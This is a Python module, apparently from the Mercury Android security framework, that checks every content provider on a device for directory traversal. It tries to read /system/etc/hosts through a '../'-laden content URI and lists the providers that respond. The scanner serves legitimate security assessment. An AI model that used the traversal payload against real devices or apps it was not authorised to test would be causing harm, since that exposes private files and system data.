from merc.lib.modules import Module

class DirTraversal(Module):

    """Description: Checks all content providers for basic directory traversal vulnerabilities
Credit: Nils - MWR Labs"""

    def __init__(self, *args, **kwargs):
        Module.__init__(self, *args, **kwargs)
        self.path = ["scanner", "provider"]

    def execute(self, session, _arg):
        # list all authorities

        info = None
        try:
            request = {}
            info = session.executeCommand("provider", "info", request).getPaddedErrorOrData()
        except BaseException, e:
            print "Exception while retrieving provider info:"
            print e
            return

        lines = info.split("\n")
        auths = []
        for l in lines:
            pos = l.find("Authority: ")
            if pos == 0:
                auths.append(l[11:])

        vuln = []
        for a in auths:
            print("checking " + a)
            uri = "content://" + a + "/../../../../../../../../system/etc/hosts"
            request = {'Uri': uri}
            #print request
            response = session.executeCommand("provider", "read", request)
            print "done"
            #print response.data
            if not ((response.isError() or len(response.data) == 0)):
                print a + " is vulnerable to directory traversal!"
                vuln.append(a)

        if len(vuln) > 0:
            print "\nVulnerable providers:"
            for v in vuln:
                print v
        else:
            print "\nNo vulnerable providers found!"

        print ""

